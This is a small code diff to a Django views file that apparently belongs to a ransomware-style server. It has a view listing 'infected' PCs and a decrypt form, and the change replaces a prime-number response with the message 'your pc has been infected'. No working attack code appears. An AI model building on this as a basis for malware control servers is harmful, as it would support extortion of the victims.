@@ -10,7 +10,6 @@ from rest_framework.response import Response
 from rest_framework.views import status
 from django.shortcuts import render
 from .forms import decryptForm
-import Crypto.Util.number as num
 from rest_framework.decorators import api_view, renderer_classes
 class ListInfectedPcView(generics.ListAPIView):
     """
@@ -72,7 +71,6 @@ def decrypt(request):
 
     return render(request, 'decrypt.html', {'form': form})
 def index(request):
-    number = num.getPrime()
-    return HttpResponse(number)
+    return HttpResponse("your pc has been infected")
     
 
